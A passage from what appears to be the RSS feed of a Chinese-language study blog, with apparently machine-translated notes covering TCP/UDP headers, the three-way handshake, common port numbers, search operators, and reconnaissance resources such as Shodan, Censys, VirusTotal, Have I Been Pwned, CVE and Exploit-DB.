          &lt;th&gt;&lt;strong&gt;Header 页眉&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Description 描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Port 源端口&lt;/td&gt;
          &lt;td&gt;此值是发送方打开的用于发送 TCP 数据包的端口。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Port 目标端口&lt;/td&gt;
          &lt;td&gt;此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source IP 源 IP&lt;/td&gt;
          &lt;td&gt;这是发送数据包的设备的 IP 地址。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination IP 目标 IP&lt;/td&gt;
          &lt;td&gt;这是数据包的目标设备的 IP 地址。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Sequence Number 序列号&lt;/td&gt;
          &lt;td&gt;当连接发生时，传输的第一条数据被赋予一个随机数。我们将在后面更深入地解释这一点。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Acknowledgement Number 鸣谢编号&lt;/td&gt;
          &lt;td&gt;为一条数据指定序列号后，下一条数据的编号将具有序列号 + 1。我们还将进一步更深入地解释这一点。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Checksum 校验和&lt;/td&gt;
          &lt;td&gt;此值提供 TCP 完整性。在记住输出的地方进行数学计算。当接收设备执行数学计算时，如果输出与发送的内容不同，则数据必须损坏。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Data 数据&lt;/td&gt;
          &lt;td&gt;此标头是存储数据（即正在传输的文件的字节）的位置。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Flag 旗&lt;/td&gt;
          &lt;td&gt;此标头确定任一设备在握手过程中应如何处理数据包。特定的标志将决定特定的行为，这就是我们将在下面解释的内容。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;接下来，我们将继续讨论&lt;em&gt;三方握手 -&lt;/em&gt; 该术语用于在两个设备之间建立连接的过程。 三方握手使用一些特殊消息进行通信 - 下表突出显示了主要消息：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;步骤&lt;/th&gt;
          &lt;th&gt;消息&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;SYN&lt;/td&gt;
          &lt;td&gt;SYN 消息是客户端在握手期间发送的初始数据包。此数据包用于启动连接并将两个设备同步在一起（我们稍后将进一步解释）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;SYN/ACK&lt;/td&gt;
          &lt;td&gt;此数据包由接收设备（服务器）发送，以确认来自客户端的同步尝试。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;ACK&lt;/td&gt;
          &lt;td&gt;The acknowledgement packet can be used by either the client or server to acknowledge that a series of messages/packets have been successfully received. 客户端或服务器可以使用确认数据包来确认已成功接收一系列消息/数据包。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;DATA&lt;/td&gt;
          &lt;td&gt;建立连接后，数据（例如文件的字节）将通过 “DATA” 消息发送。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;5&lt;/td&gt;
          &lt;td&gt;FIN&lt;/td&gt;
          &lt;td&gt;此数据包用于在连接完成后&lt;em&gt;干净（正确）&lt;/em&gt; 关闭连接。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;#&lt;/td&gt;
          &lt;td&gt;RST&lt;/td&gt;
          &lt;td&gt;此数据包会突然结束所有通信。这是最后的手段，表明在此过程中存在一些问题。例如，如果服务或应用程序无法正常工作，或者系统存在资源不足等故障。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下图显示了 Alice 和 Bob 之间的正常 Three-way 握手过程。在现实生活中，这将是在两个设备之间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092315229.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092315229&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;任何发送的数据都会被赋予一个随机数字序列，并使用此数字序列并以 1 为增量进行重建。两台计算机必须就相同的编号规则达成一致，才能以正确的顺序发送数据。此顺序分三个步骤达成一致：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;SYN - 客户端：这是我的初始序列号 （ISN），用于 &lt;strong&gt;SYN&lt;/strong&gt;chronise （0）&lt;/li&gt;
&lt;li&gt;SYN/ACK - 服务器：这是我用 （5,000） 记录 &lt;strong&gt;SYN&lt;/strong&gt; 的初始序列号 （ISN），我&lt;strong&gt;现在确认&lt;/strong&gt;您的初始编号序列 （0）&lt;/li&gt;
&lt;li&gt;ACK - 客户端：我&lt;strong&gt;确认&lt;/strong&gt;您的初始序列号 （ISN） 为 （5,000），下面是我的 ISN+1 （0 + 1） 的一些数据&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Device&lt;/th&gt;
          &lt;th&gt;初始编号序列 （ISN）&lt;/th&gt;
          &lt;th&gt;最终编号序列&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;客户端 （发件人）&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;0 + 1 = 1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;客户端 （发件人）&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;1 + 1 = 2&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;客户端 （发件人）&lt;/td&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;2 + 1 = 3&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;TCP 协议关闭连接：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;让我们快速解释一下 TCP 关闭连接背后的过程。首先， 一旦设备确定另一台设备已成功接收所有数据，TCP 将关闭连接。&lt;/p&gt;
&lt;p&gt;由于 TCP 会在设备上保留系统资源，因此最佳做法是尽快关闭 TCP 连接。&lt;/p&gt;
&lt;p&gt;要启动关闭 TCP 连接，设备将向另一台设备发送 “FIN” 数据包。当然，使用 TCP 时，另一台设备也必须确认此数据包。&lt;/p&gt;
&lt;p&gt;让我们像以前一样使用 Alice 和 Bob 来演示这个过程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092456294.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092456294&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在图中，我们可以看到 Alice 向 Bob 发送了一个 “&lt;strong&gt;FIN&lt;/strong&gt;” 数据包。因为 Bob 收到了这个，所以他会让 Alice 知道他收到了这个，并且他还想关闭连接（使用 FIN）。Alice 已经清楚地听到了 Bob 的声音，并会让 Bob 知道她承认了这一点。&lt;/p&gt;
&lt;h2 id=&#34;udpip-协议&#34;&gt;UDP/IP 协议
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;U&lt;/strong&gt;ser &lt;strong&gt;D&lt;/strong&gt;atagram &lt;strong&gt;P&lt;/strong&gt;rotocol （&lt;strong&gt;UDP&lt;/strong&gt;） 是另一种用于在设备之间传输数据的协议。&lt;/p&gt;
&lt;p&gt;与其兄弟 TCP 不同，UDP 是一种 &lt;strong&gt;无 状态&lt;/strong&gt;协议，不需要两个设备之间持续连接即可发送数据。例如，不会发生 Three-way hand shake，两个设备之间也没有任何同步。&lt;/p&gt;
&lt;p&gt;回想一下 3 号房间中对这两个协议所做的一些比较：“OSI 模型”。也就是说，UDP 用于应用程序可以容忍数据丢失的情况（例如视频流或语音聊天）或不稳定的连接不是最终结果的情况。下表比较了 UDP 的优缺点：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的优势&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;UDP 的缺点&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 比 TCP 快得多。&lt;/td&gt;
          &lt;td&gt;UDP 不关心数据是否被接收。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 让应用程序（用户软件）决定是否可以控制数据包的发送速度。&lt;/td&gt;
          &lt;td&gt;从这个意义上说，它对软件开发人员来说是相当灵活的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;UDP 不会像 TCP 那样在设备上保留连续连接。&lt;/td&gt;
          &lt;td&gt;这意味着不稳定的连接会给用户带来糟糕的体验。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如前所述，在两个设备之间建立连接时不会发生任何过程。这意味着不考虑是否接收数据，也没有像 TCP 提供的保护措施，例如数据完整性。&lt;/p&gt;
&lt;p&gt;UDP 数据包比 TCP 数据包简单得多，并且标头更少。但是，这两种协议共享一些标准标头，下表中对此进行了注释：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Header 页眉&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Time to Live (TTL) 生存时间 （TTL）&lt;/td&gt;
          &lt;td&gt;此字段为数据包设置到期计时器，因此如果数据包从未成功到达主机或逃逸，它不会阻塞您的网络！&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Address 源地址&lt;/td&gt;
          &lt;td&gt;发送数据包的设备的 IP 地址，以便数据知道要返回到何处。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Address 目标地址&lt;/td&gt;
          &lt;td&gt;数据包发送到的设备 IP 地址，以便数据知道下一步要传输到何处。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Source Port 源端口&lt;/td&gt;
          &lt;td&gt;此值是发送方打开的端口，用于发送 UDP 数据包。此值是随机选择的（从当时尚未使用的 0-65535 端口中）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Destination Port 目标端口&lt;/td&gt;
          &lt;td&gt;此值是应用程序或服务在远程主机（接收数据的主机）上运行的端口号;例如，在端口 80 上运行的 Web 服务器。与源端口不同，此值不是随机选择的。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Data 数据&lt;/td&gt;
          &lt;td&gt;此标头是存储数据（即正在传输的文件的字节）的位置。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;接下来，我们将继续讨论通过 UDP 进行连接的过程与 TCP 等过程有何不同。 我们应该记住 UDP 是&lt;strong&gt;无状态&lt;/strong&gt;的。连接期间不会发送确认。&lt;/p&gt;
&lt;p&gt;下图显示了 Alice 和 Bob 之间的正常 UDP 连接。在现实生活中，这将是在两个设备之间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324092646004.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324092646004&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;端口&#34;&gt;端口
&lt;/h2&gt;&lt;p&gt;也许正如他们的名字一样，端口是可以交换数据的重要点。想想港口和港口。希望停靠港口的船舶必须前往与船上的尺寸和设施相适应的港口。当船只排队时，它将连接到港口的港口 。例如，邮轮不能停靠在为渔船建造的港口，反之亦然。&lt;/p&gt;
&lt;p&gt;这些端口强制规定了什么可以停放以及停在哪里——如果不兼容，它就不能停在这里。网络设备在相互通信时也使用端口来执行严格的规则。建立连接后（从 OSI 模型的房间调用），设备发送或接收的任何数据都将通过这些端口发送。在计算中，端口是介于 0 和 65535 （65,535） 之间的 数值 。&lt;/p&gt;
&lt;p&gt;由于端口的范围可以在 0 到 65535 之间的任何位置，因此很快就会忘记哪个应用程序正在使用哪个端口。繁忙的港口一片混乱！值得庆幸的是，我们将应用程序、软件和行为与一组标准规则相关联。例如，通过强制通过端口 80 发送任何 Web 浏览器数据，软件开发人员可以设计一个 Web 浏览器（如 Google Chrome 或 Firefox）来以相同的方式解释数据。&lt;/p&gt;
&lt;p&gt;这意味着所有 Web 浏览器现在都共享一个通用规则：数据通过端口 80 发送。浏览器的外观、感觉和易用性取决于设计师或用户的决定。&lt;/p&gt;
&lt;p&gt;虽然 Web 数据的标准规则是 &lt;em&gt;端口 80&lt;/em&gt;，但已为其他一些协议分配了标准规则。介于 0 和 1024 （1,024） 之间的 任何端口都称为公共端口。  让我们在下面探索一些其他协议：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Protocol 协议&lt;/th&gt;
          &lt;th&gt;端口号&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;F&lt;/strong&gt;ile &lt;strong&gt;T&lt;/strong&gt;ransfer &lt;strong&gt;P&lt;/strong&gt;rotocol (&lt;strong&gt;FTP&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;21&lt;/td&gt;
          &lt;td&gt;此协议由基于客户端-服务器模型构建的文件共享应用程序使用，这意味着您可以从中心位置下载文件。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;S&lt;/strong&gt;ecure &lt;strong&gt;Sh&lt;/strong&gt;ell (&lt;strong&gt;SSH&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;22&lt;/td&gt;
          &lt;td&gt;该协议用于通过基于文本的界面安全地登录系统以进行管理。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;H&lt;/strong&gt;yper&lt;strong&gt;T&lt;/strong&gt;ext Transfer Protocol (&lt;strong&gt;HTTP&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;80&lt;/td&gt;
          &lt;td&gt;该协议为万维网 （WWW） 提供支持！您的浏览器使用它来下载网页的文本、图像和视频。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;H&lt;/strong&gt;yper&lt;strong&gt;T&lt;/strong&gt;ext &lt;strong&gt;T&lt;/strong&gt;ransfer &lt;strong&gt;P&lt;/strong&gt;rotocol &lt;strong&gt;S&lt;/strong&gt;ecure (&lt;strong&gt;HTTPS&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;443&lt;/td&gt;
          &lt;td&gt;该协议的作用与上述完全相同;但是，安全地使用加密。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;S&lt;/strong&gt;erver &lt;strong&gt;M&lt;/strong&gt;essage &lt;strong&gt;B&lt;/strong&gt;lock (&lt;strong&gt;SMB&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;445&lt;/td&gt;
          &lt;td&gt;此协议类似于文件传输协议 （FTP）;但是，除了文件之外，SMB 还允许您共享打印机等设备。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;R&lt;/strong&gt;emote &lt;strong&gt;D&lt;/strong&gt;esktop &lt;strong&gt;P&lt;/strong&gt;rotocol (&lt;strong&gt;RDP&lt;/strong&gt;)&lt;/td&gt;
          &lt;td&gt;3389&lt;/td&gt;
          &lt;td&gt;此协议是一种使用可视化桌面界面登录系统的安全方法（与 SSH 协议的基于文本的限制相反）。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;我们只简要介绍了网络安全中更常见的协议。有关更多信息，您可以找到&lt;a class=&#34;link&#34; href=&#34;http://www.vmaxx.net/techinfo/ports.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;列出的 1024 个常用端口的表 &lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;这里值得注意的是，这些协议只遵循标准。即，您可以在标准端口以外的其他端口（在 8080 而不是 80 标准端口上运行 Web 服务器）上管理与这些协议交互的应用程序。但请注意，应用程序将假定遵循标准，因此您必须提供&lt;strong&gt;冒号 （:)&lt;/strong&gt; 以及端口号。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>搜索技巧</title>
        <link>https://Yerucrem.github.io/p/%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/ai-generated-9438277.jpg" alt="Featured image of post 搜索技巧" /&gt;&lt;h1 id=&#34;搜索技巧&#34;&gt;搜索技巧
&lt;/h1&gt;&lt;h2 id=&#34;搜索引擎&#34;&gt;搜索引擎
&lt;/h2&gt;&lt;p&gt;我们每个人都使用过互联网搜索引擎;但是，并不是每个人都尝试利用 Internet 搜索引擎的全部功能。几乎每个 Internet 搜索引擎都允许您进行高级搜索。请考虑以下示例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.google.com/advanced_search&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Google 谷歌&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://support.microsoft.com/en-us/topic/advanced-search-options-b92e25f1-0085-4271-bdf9-14aaea720930&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Bing 必应&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://duckduckgo.com/duckduckgo-help-pages/results/syntax/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;DuckDuckGo 鸭鸭 Go&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们考虑一下 Google 支持的搜索运算符。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;exact phrase&amp;quot;&lt;/code&gt;：双引号表示您正在查找包含确切单词或短语的页面。例如，人们可能会搜索 &lt;code&gt;“passive reconnaissance”&lt;/code&gt; 来获取包含此确切短语的页面。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;site:&lt;/code&gt;： 此运算符允许您指定要将搜索限制到的域名。例如，我们可以使用 在 TryHackMe 上搜索 &lt;code&gt;site:tryhackme.com success stories&lt;/code&gt; 成功案例。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt;：减号允许您省略包含特定单词或短语的搜索结果。例如，您可能对了解金字塔感兴趣，但不想查看旅游网站;一种方法是搜索 &lt;code&gt;pyramids -tourism&lt;/code&gt; 或 &lt;code&gt;-tourism pyramids&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;filetype:&lt;/code&gt;： 此搜索运算符对于查找文件而不是网页是必不可少的。您可以使用 Google 搜索的一些文件类型是可移植文档格式 （PDF）、Microsoft Word 文档 （DOC）、Microsoft Excel 电子表格 （XLS） 和 Microsoft PowerPoint 演示文稿 （PPT）。例如，要查找网络安全演示文稿，请尝试搜索 &lt;code&gt;filetype：ppt cyber security&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;您可以在此&lt;a class=&#34;link&#34; href=&#34;https://github.com/cipher387/Advanced-search-operators-list&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;高级搜索运算符列表中&lt;/a&gt;查看各种搜索引擎中的更高级控件;但是，以上提供了一个很好的起点。检查您最喜欢的搜索引擎，了解支持的搜索运算符。&lt;/p&gt;
&lt;h2 id=&#34;专业搜索引擎&#34;&gt;专业搜索引擎
&lt;/h2&gt;&lt;p&gt;您熟悉 Internet 搜索引擎;但是，您对专业搜索引擎熟悉多少？我们指的是用于查找特定类型结果的搜索引擎。&lt;/p&gt;
&lt;h3 id=&#34;shodan&#34;&gt;Shodan
&lt;/h3&gt;&lt;p&gt;让我们从 &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan&lt;/a&gt; 开始，这是一个用于连接到 Internet 的设备的搜索引擎。它允许您搜索特定类型和版本的服务器、网络设备、工业控制系统和 IoT 设备。您可能希望查看仍有多少服务器仍在运行 Apache 2.4.1 以及各个国家/地区的分布情况。要找到答案，我们可以搜索 &lt;code&gt;apache 2.4.1&lt;/code&gt;，它将返回标头中包含字符串“apache 2.4.1”的服务器列表。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324114956212.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324114956212&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;考虑访问 Shodan &lt;a class=&#34;link&#34; href=&#34;https://www.shodan.io/search/examples&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Search Query Examples&lt;/a&gt; 了解更多示例。此外，如果您有订阅，您可以查看 &lt;a class=&#34;link&#34; href=&#34;https://trends.shodan.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Shodan 趋势&lt;/a&gt;以获取历史见解。&lt;/p&gt;
&lt;h3 id=&#34;censys&#34;&gt;Censys
&lt;/h3&gt;&lt;p&gt;乍一看，&lt;a class=&#34;link&#34; href=&#34;https://search.censys.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Censys&lt;/a&gt; 似乎与 Shodan 相似。但是，Shodan 专注于连接互联网的设备和系统，例如服务器、路由器、网络摄像头和 IoT 设备。另一方面，Censys 专注于连接 Internet 的主机、网站、证书和其他 Internet 资产。它的一些用例包括枚举正在使用的域、审计开放端口和服务以及发现网络中的流氓资产。您可能需要检查 &lt;a class=&#34;link&#34; href=&#34;https://support.censys.io/hc/en-us/articles/20720064229140-Censys-Search-Use-Cases&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Censys Search Use Cases&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115019928.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115019928&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;virustotal&#34;&gt;VirusTotal
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.virustotal.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;VirusTotal&lt;/a&gt; 是一个在线网站，它使用多个防病毒引擎为文件提供病毒扫描服务。它允许用户上传文件或提供 URL，以便在一次作中针对众多防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希值来检查以前上传的文件的结果。&lt;/p&gt;
&lt;p&gt;下面的屏幕截图显示了根据 67 个防病毒引擎检查提交的文件的结果。此外，您可以查看社区的评论以获得更多见解。有时，文件可能会被标记为病毒或特洛伊木马程序;但是，由于各种原因，这可能不准确，这时社区成员可以提供更深入的解释。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115044180.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115044180&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;have-i-been-pwned&#34;&gt;Have I Been Pwned
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://haveibeenpwned.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Have I Been Pwned&lt;/a&gt; （HIBP） 只做一件事;它会告诉您电子邮件地址是否出现在数据泄露事件中。在泄露的数据中找到一个人的电子邮件表明私人信息泄露，更重要的是，密码泄露。许多用户在多个平台上使用相同的密码，如果一个平台被泄露，他们在其他平台上的密码也会暴露。事实上，密码通常以加密格式存储;但是，许多密码并不那么复杂，可以使用各种攻击来恢复。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115103918.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115103918&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞和漏洞利用&#34;&gt;漏洞和漏洞利用
&lt;/h2&gt;&lt;h3 id=&#34;cve-漏洞&#34;&gt;CVE 漏洞
&lt;/h3&gt;&lt;p&gt;我们可以将 Common Vulnerabilities and Exposures （CVE） 程序视为漏洞字典。它为软件和硬件产品中的漏洞和安全问题提供标准化标识符。每个漏洞都分配有一个采用标准化格式（如 &lt;code&gt;CVE-2024-29988&lt;/code&gt;）的 CVE ID。此唯一标识符 （CVE ID） 可确保从安全研究人员到供应商和 IT 专业人员的每个人都引用相同的漏洞，在本例中为 &lt;a class=&#34;link&#34; href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-29988&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2024-29988&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;MITRE Corporation 维护 CVE 系统。有关更多信息和搜索现有 CVE，请访问 &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE 计划 &lt;/a&gt;Web 站点。或者，访问&lt;a class=&#34;link&#34; href=&#34;https://nvd.nist.gov/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;国家漏洞数据库 &lt;/a&gt;（NVD） 网站。下面的屏幕截图显示了 CVE-2014-0160，也称为 Heartbleed。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115529104.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115529104&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用数据库&#34;&gt;漏洞利用数据库
&lt;/h3&gt;&lt;p&gt;您想要利用易受攻击的应用程序的原因有很多;一种是将公司的安全性作为其红队的一部分进行评估。不用说，除非我们得到许可，否则我们不应该试图利用易受攻击的系统，通常是通过具有法律约束力的协议。&lt;/p&gt;
&lt;p&gt;现在我们有权利用易受攻击的系统，我们可能需要找到一个有效的漏洞利用代码。一种资源是 &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Exploit Database&lt;/a&gt;。漏洞利用数据库列出了来自不同作者的漏洞利用代码;其中一些漏洞利用代码已经过测试并标记为已验证。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115610601.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115610601&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub&lt;/a&gt; 是一个基于 Web 的软件开发平台，可以包含许多与 CVE 相关的工具，以及概念验证 （PoC） 和漏洞利用代码。要演示此想法，请查看下面的 GitHub 上与 Heartbleed 漏洞相关的搜索结果的屏幕截图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250324115636916.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250324115636916&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;技术文档&#34;&gt;技术文档
